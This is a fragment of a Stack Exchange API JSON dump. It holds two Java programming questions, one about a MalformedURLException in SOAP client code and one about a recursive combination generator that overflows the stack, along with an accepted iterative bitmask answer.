/>\n<p>If this is not making sense, please provide a proper complete <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, AND the stack trace that you get from executing that example.</p>\n"}],"owner":{"account_id":3977988,"reputation":43,"user_id":3280711,"accept_rate":33,"display_name":"user3280711"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2357,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":2,"score":-1,"last_activity_date":1642460342,"creation_date":1409918115,"question_id":25685347,"body_markdown":" \r\nI&#39;ve the following code \r\n```\r\n    String url = &quot;http://e2e-soaservices:44000/3.1/StandardDocumentService?wsdl&quot;;\r\n    //createSOAPRequest(); \r\n    SOAPMessage soapResponse = soapConnection.call(createSOAPRequest(), url);\r\n```\r\nin the createSOAPRequest Method:-\r\n```\r\n    MessageFactory messageFactory = MessageFactory.newInstance();\r\n    SOAPMessage soapMessage = messageFactory.createMessage();\r\n    SOAPPart soapPart = soapMessage.getSOAPPart();\r\n    File fXmlFile = new File(&quot;src/XML/gen_VDD7S0PLYPAS058_1409900400000_2.xml&quot;);\r\n \tString xmlStr=finalXmlString(fXmlFile);\r\n \tDocumentBuilderFactory docBuilderFactory=DocumentBuilderFactory.newInstance();\r\n \tdocBuilderFactory.setNamespaceAware(true);   \r\n    DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();   \r\n    Document doc=docBuilder.parse(xmlStr);  \r\n  \tSystem.out.println(&quot;dasdasdasd&quot;+doc.toString());\r\n    String serverURI = &quot;http://www.aaancnuie.com/DCS/2012/01/DocumentCreation/IStandardDocumentService/CreateDocuments&quot;;\r\n    \r\n    // SOAP Envelope\r\n    SOAPEnvelope envelope = soapPart.getEnvelope();\r\n    envelope.addNamespaceDeclaration(&quot;example&quot;, serverURI);\r\n    SOAPBody soapBody = envelope.getBody();\r\n    soapBody.setTextContent(xmlStr);\r\n    soapMessage.saveChanges();\r\n    return soapMessage;\r\n```\r\nThe error message\r\n\r\n    Error occurred while sending SOAP Request to Server\r\n    java.net.MalformedURLException: no protocol: http%3A%2F%2Fe2e-soaservices%3A44000%2F3.1%2FStandardDocumentService%3Fwsdl\r\n        at java.net.URL.&lt;init&gt;(URL.java:567)\r\n        at java.net.URL.&lt;init&gt;(URL.java:464)\r\n        at java.net.URL.&lt;init&gt;(URL.java:413)\r\n        at SOAPCLIENTSAAJ.main(SOAPCLIENTSAAJ.java:36)","title":"java.net.MalformedURLException:no protocol","body":"<p>I've the following code</p>\n<pre><code>    String url = &quot;http://e2e-soaservices:44000/3.1/StandardDocumentService?wsdl&quot;;\n    //createSOAPRequest(); \n    SOAPMessage soapResponse = soapConnection.call(createSOAPRequest(), url);\n</code></pre>\n<p>in the createSOAPRequest Method:-</p>\n<pre><code>    MessageFactory messageFactory = MessageFactory.newInstance();\n    SOAPMessage soapMessage = messageFactory.createMessage();\n    SOAPPart soapPart = soapMessage.getSOAPPart();\n    File fXmlFile = new File(&quot;src/XML/gen_VDD7S0PLYPAS058_1409900400000_2.xml&quot;);\n    String xmlStr=finalXmlString(fXmlFile);\n    DocumentBuilderFactory docBuilderFactory=DocumentBuilderFactory.newInstance();\n    docBuilderFactory.setNamespaceAware(true);   \n    DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();   \n    Document doc=docBuilder.parse(xmlStr);  \n    System.out.println(&quot;dasdasdasd&quot;+doc.toString());\n    String serverURI = &quot;http://www.aaancnuie.com/DCS/2012/01/DocumentCreation/IStandardDocumentService/CreateDocuments&quot;;\n    \n    // SOAP Envelope\n    SOAPEnvelope envelope = soapPart.getEnvelope();\n    envelope.addNamespaceDeclaration(&quot;example&quot;, serverURI);\n    SOAPBody soapBody = envelope.getBody();\n    soapBody.setTextContent(xmlStr);\n    soapMessage.saveChanges();\n    return soapMessage;\n</code></pre>\n<p>The error message</p>\n<pre><code>Error occurred while sending SOAP Request to Server\njava.net.MalformedURLException: no protocol: http%3A%2F%2Fe2e-soaservices%3A44000%2F3.1%2FStandardDocumentService%3Fwsdl\n    at java.net.URL.&lt;init&gt;(URL.java:567)\n    at java.net.URL.&lt;init&gt;(URL.java:464)\n    at java.net.URL.&lt;init&gt;(URL.java:413)\n    at SOAPCLIENTSAAJ.main(SOAPCLIENTSAAJ.java:36)\n</code></pre>\n"},{"tags":["java","combinations"],"comments":[{"owner":{"account_id":3131031,"reputation":24013,"user_id":2648811,"accept_rate":33,"display_name":"Green Cloak Guy"},"score":0,"creation_date":1642446689,"post_id":70746281,"comment_id":125068111,"body_markdown":"Have you tried debugging, or adding a print statement at the beginning of `Combo()` to see what sequence of recursive calls leads to an infinite loop?","body":"Have you tried debugging, or adding a print statement at the beginning of <code>Combo()</code> to see what sequence of recursive calls leads to an infinite loop?"}],"answers":[{"tags":[],"owner":{"account_id":114128,"reputation":50422,"user_id":300257,"accept_rate":89,"display_name":"Gilbert Le Blanc"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642460149,"creation_date":1642460149,"answer_id":70748450,"question_id":70746281,"body_markdown":"Jave method names should always start with a lower case letter.\r\n\r\nYou should also use a `java.util.List` as a method return value.\r\n\r\nI don&#39;t like writing recursive code, so I wrote an iterative solution.  I used a bit trick I learned a while back to generate all combinations.  The bit patterns of all the integers from zero to 2^N give all the combinations of N length.\r\n\r\nIn this code, I test for the number of true values you&#39;re seeking.\r\n\r\nHere are my test results for 4,2 and 6,2.  I formatted the results to fit in the answer.\r\n\r\n    [[true, true, false, false], [true, false, true, false], \r\n     [false, true, true, false], [true, false, false, true], \r\n     [false, true, false, true], [false, false, true, true]]\r\n    \r\n    [[true, true, false, false, false, false], \r\n     [true, false, true, false, false, false], \r\n     [false, true, true, false, false, false], \r\n     [true, false, false, true, false, false], \r\n     [false, true, false, true, false, false], \r\n     [false, false, true, true, false, false], \r\n     [true, false, false, false, true, false], \r\n     [false, true, false, false, true, false], \r\n     [false, false, true, false, true, false], \r\n     [false, false, false, true, true, false], \r\n     [true, false, false, false, false, true], \r\n     [false, true, false, false, false, true], \r\n     [false, false, true, false, false, true], \r\n     [false, false, false, true, false, true], \r\n     [false, false, false, false, true, true]]\r\n\r\nHere&#39;s the complete runnable code.\r\n\r\n    import java.util.ArrayList;\r\n    import java.util.Arrays;\r\n    import java.util.List;\r\n    \r\n    public class CombinationAlgorithm {\r\n    \r\n    \tpublic static void main(String[] args) {\r\n    \t\tCombinationAlgorithm ca = new CombinationAlgorithm();\r\n    \t\tList&lt;boolean[]&gt; comboList = ca.combo(4, 2);\r\n    \t\tca.printList(comboList);\r\n    \t\tcomboList = ca.combo(6, 2);\r\n    \t\tca.printList(comboList);\r\n    \t}\r\n    \t\r\n    \tpublic List&lt;boolean[]&gt; combo(int elementCount, int trueCount) {\r\n    \t\tList&lt;boolean[]&gt; comboList = new ArrayList&lt;&gt;();\r\n    \t\t\r\n    \t\tif (elementCount &lt; trueCount) {\r\n    \t\t\t// Return empty list\r\n    \t\t\treturn comboList;\r\n    \t\t}\r\n    \t\t\r\n    \t\tint limit = (int) Math.pow(2.0, elementCount);\r\n    \t\tfor (int index = 0; index &lt; limit; index++) {\r\n    \t\t\tif (Integer.bitCount(index) == trueCount) {\r\n    \t\t\t\tboolean[] values = new boolean[elementCount];\r\n    \t\t\t\tfor (int bit = 0; bit &lt; elementCount; bit++) {\r\n    \t\t\t\t\tif (getBit(index, bit) == 0) {\r\n    \t\t\t\t\t\tvalues[bit] = false;\r\n    \t\t\t\t\t} else {\r\n    \t\t\t\t\t\tvalues[bit] = true;\r\n    \t\t\t\t\t}\r\n    \t\t\t\t}\r\n    \t\t\t\tcomboList.add(values);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\t\r\n    \t\treturn comboList;\r\n    \t}\r\n    \t\r\n    \tprivate int getBit(int value, int bit) {\r\n    \t    return (value &gt;&gt; bit) &amp; 1;\r\n    \t}\r\n    \t\r\n    \tprivate void printList(List&lt;boolean[]&gt; comboList) {\r\n    \t\tSystem.out.print(&quot;[&quot;);\r\n    \t\tfor (int index = 0; index &lt; comboList.size(); index++) {\r\n    \t\t\tboolean[] values =  comboList.get(index);\r\n    \t\t\tSystem.out.print(Arrays.toString(values));\r\n    \t\t\tif (index &lt; (comboList.size() - 1)) {\r\n    \t\t\t\tSystem.out.print(&quot;, &quot;);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\tSystem.out.println(&quot;]&quot;);\r\n    \t}\r\n    \r\n    }\r\n\r\n","title":"Combination algorithm Java","body":"<p>Jave method names should always start with a lower case letter.</p>\n<p>You should also use a <code>java.util.List</code> as a method return value.</p>\n<p>I don't like writing recursive code, so I wrote an iterative solution.  I used a bit trick I learned a while back to generate all combinations.  The bit patterns of all the integers from zero to 2^N give all the combinations of N length.</p>\n<p>In this code, I test for the number of true values you're seeking.</p>\n<p>Here are my test results for 4,2 and 6,2.  I formatted the results to fit in the answer.</p>\n<pre><code>[[true, true, false, false], [true, false, true, false], \n [false, true, true, false], [true, false, false, true], \n [false, true, false, true], [false, false, true, true]]\n\n[[true, true, false, false, false, false], \n [true, false, true, false, false, false], \n [false, true, true, false, false, false], \n [true, false, false, true, false, false], \n [false, true, false, true, false, false], \n [false, false, true, true, false, false], \n [true, false, false, false, true, false], \n [false, true, false, false, true, false], \n [false, false, true, false, true, false], \n [false, false, false, true, true, false], \n [true, false, false, false, false, true], \n [false, true, false, false, false, true], \n [false, false, true, false, false, true], \n [false, false, false, true, false, true], \n [false, false, false, false, true, true]]\n</code></pre>\n<p>Here's the complete runnable code.</p>\n<pre><code>import java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class CombinationAlgorithm {\n\n    public static void main(String[] args) {\n        CombinationAlgorithm ca = new CombinationAlgorithm();\n        List&lt;boolean[]&gt; comboList = ca.combo(4, 2);\n        ca.printList(comboList);\n        comboList = ca.combo(6, 2);\n        ca.printList(comboList);\n    }\n    \n    public List&lt;boolean[]&gt; combo(int elementCount, int trueCount) {\n        List&lt;boolean[]&gt; comboList = new ArrayList&lt;&gt;();\n        \n        if (elementCount &lt; trueCount) {\n            // Return empty list\n            return comboList;\n        }\n        \n        int limit = (int) Math.pow(2.0, elementCount);\n        for (int index = 0; index &lt; limit; index++) {\n            if (Integer.bitCount(index) == trueCount) {\n                boolean[] values = new boolean[elementCount];\n                for (int bit = 0; bit &lt; elementCount; bit++) {\n                    if (getBit(index, bit) == 0) {\n                        values[bit] = false;\n                    } else {\n                        values[bit] = true;\n                    }\n                }\n                comboList.add(values);\n            }\n        }\n        \n        return comboList;\n    }\n    \n    private int getBit(int value, int bit) {\n        return (value &gt;&gt; bit) &amp; 1;\n    }\n    \n    private void printList(List&lt;boolean[]&gt; comboList) {\n        System.out.print(&quot;[&quot;);\n        for (int index = 0; index &lt; comboList.size(); index++) {\n            boolean[] values =  comboList.get(index);\n            System.out.print(Arrays.toString(values));\n            if (index &lt; (comboList.size() - 1)) {\n                System.out.print(&quot;, &quot;);\n            }\n        }\n        System.out.println(&quot;]&quot;);\n    }\n\n}\n</code></pre>\n"}],"owner":{"account_id":22310675,"reputation":349,"user_id":16534694,"display_name":"Ryan Fu"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":84,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70748450,"answer_count":1,"score":0,"last_activity_date":1642460149,"creation_date":1642446027,"question_id":70746281,"body_markdown":"I&#39;m trying to write a function: `private static ArrayList&lt;boolean[]&gt; Combo(int i, int j)` where it&#39;d be a sort of &quot;concrete&quot; implementation of `iCj` in math:\r\n\r\n`Combo(4,2)` would return an arraylist of `{true, true, false, false}, {true, false, true, false}, {false, true, true, false}, {false, true, false, true}, {false, false, true, true}` (in no particular order).\r\n\r\nCurrently, I&#39;ve got a recursive algorithm like this:\r\n\r\n    private static ArrayList&lt;boolean[]&gt; Combo(int i, int j) {\r\n    \t\tArrayList&lt;boolean[]&gt; k = new ArrayList&lt;boolean[]&gt;();\r\n    \t\tif (i == 1 &amp;&amp; j == 0) {\r\n    \t\t\tk.add(new boolean[]{false});\r\n    \t\t} else if (i == 1 &amp;&amp; j ==1) {\r\n    \t\t\tk.add(new boolean[]{true});\r\n    \t\t} else if (j&gt;i) {\r\n    \t\t\t;\r\n    \t\t} else {\r\n    \t\t\tArrayList&lt;boolean[]&gt; a1 = Combo((byte) i/2,1);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a2 = Combo((byte) i/2,2);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a3 = Combo((byte) i/2,3);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a4 = Combo((byte) i/2,4);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a5 = Combo((byte) i/2,5);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a6 = Combo((byte) i/2,6);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a7 = Combo((byte) i/2,7);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a8 = Combo((byte) i/2,8);\r\n    \t\t\tArrayList&lt;boolean[]&gt; a9 = Combo((byte) i/2,9);\r\n    \r\n    \t\t\tk.addAll(merge(a1,a9,j));\r\n    \t\t\tk.addAll(merge(a2,a8,j));\r\n    \t\t\tk.addAll(merge(a3,a7,j));\r\n    \t\t\tk.addAll(merge(a4,a6,j));\r\n    \t\t\tk.addAll(merge(a5,a5,j));\r\n    \r\n    \t\t\t\r\n    \t\t}\r\n    \t\t\r\n    \t\treturn k;\r\n    \t}\r\n    \t\r\n    \tprivate static ArrayList&lt;boolean[]&gt; merge(ArrayList&lt;boolean[]&gt; a1, ArrayList&lt;boolean[]&gt; a2, int tot) {\r\n    \t\tArrayList&lt;boolean[]&gt; k = new ArrayList&lt;boolean[]&gt;();\r\n    \t\t\r\n    \t\tfor (boolean[] b : a1) {\r\n    \t\t\tfor (boolean[] b1: a2) {\r\n    \t\t\t\tboolean[] c = new boolean[tot];\r\n    \t\t\t\tfor (int i = 0 ; i&lt; b.length; i++) {\r\n    \t\t\t\t\tc[i] = b[i];\r\n    \t\t\t\t}\r\n    \t\t\t\tfor (int i = b.length; i&lt;b.length+b1.length; i++) {\r\n    \t\t\t\t\tc[i] = b1[i-b.length];\r\n    \t\t\t\t}\r\n    \t\t\t\tk.add(b);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\t\r\n    \t\treturn k;\r\n    \t}\r\n\r\nBut I&#39;m getting `Exception in thread &quot;main&quot; java.lang.StackOverflowError` on line 129.\r\n\r\nCan anyone please help me optimize this?","title":"Combination algorithm Java","body":"<p>I'm trying to write a function: <code>private static ArrayList&lt;boolean[]&gt; Combo(int i, int j)</code> where it'd be a sort of &quot;concrete&quot; implementation of <code>iCj</code> in math:</p>\n<p><code>Combo(4,2)</code> would return an arraylist of <code>{true, true, false, false}, {true, false, true, false}, {false, true, true, false}, {false, true, false, true}, {false, false, true, true}</code> (in no particular order).</p>\n<p>Currently, I've got a recursive algorithm like this:</p>\n<pre><code>private static ArrayList&lt;boolean[]&gt; Combo(int i, int j) {\n        ArrayList&lt;boolean[]&gt; k = new ArrayList&lt;boolean[]&gt;();\n        if (i == 1 &amp;&amp; j == 0) {\n            k.add(new boolean[]{false});\n        } else if (i == 1 &amp;&amp; j ==1) {\n            k.add(new boolean[]{true});\n        } else if (j&gt;i) {\n            ;\n        } else {\n            ArrayList&lt;boolean[]&gt; a1 = Combo((byte) i/2,1);\n            ArrayList&lt;boolean[]&gt; a2 = Combo((byte) i/2,2);\n            ArrayList&lt;boolean[]&gt; a3 = Combo((byte) i/2,3);\n            ArrayList&lt;boolean[]&gt; a4 = Combo((byte) i/2,4);\n            ArrayList&lt;boolean[]&gt; a5 = Combo((byte) i/2,5);\n            ArrayList&lt;boolean[]&gt; a6 = Combo((byte) i/2,6);\n            ArrayList&lt;boolean[]&gt; a7 = Combo((byte) i/2,7);\n            ArrayList&lt;boolean[]&gt; a8 = Combo((byte) i/2,8);\n            ArrayList&lt;boolean[]&gt; a9 = Combo((byte) i/2,9);\n\n            k.addAll(merge(a1,a9,j));\n            k.addAll(merge(a2,a8,j));\n            k.addAll(merge(a3,a7,j));\n            k.addAll(merge(a4,a6,j));\n            k.addAll(merge(a5,a5,j));\n\n            \n        }\n        \n        return k;\n    }\n    \n    private static ArrayList&lt;boolean[]&gt; merge(ArrayList&lt;boolean[]&gt; a1, ArrayList&lt;boolean[]&gt; a2, int tot) {\n        ArrayList&lt;boolean[]&gt; k = new ArrayList&lt;boolean[]&gt;();\n        \n        for (boolean[] b : a1) {\n            for (boolean[] b1: a2) {\n                boolean[] c = new boolean[tot];\n                for (int i = 0 ; i&lt; b.length; i++) {\n                    c[i] = b[i];\n                }\n                for (int i = b.length; i&lt;b.length+b1.length; i++) {\n                    c[i] = b1[i-b.length];\n                }\n                k.add(b);\n            }\n        }\n        \n        return k;\n    }\n</code></pre>\n<p>But I'm getting <code>Exception in thread &quot;main&quot; java.lang.StackOverflowError</code> on line 129.</p>\n<p>Can anyone please help me optimize this?</p>\n"}],"has_more":true,"backoff":10,"quota_max":10000,"quota_remaining":8320,"page":1672,"page_size":100}
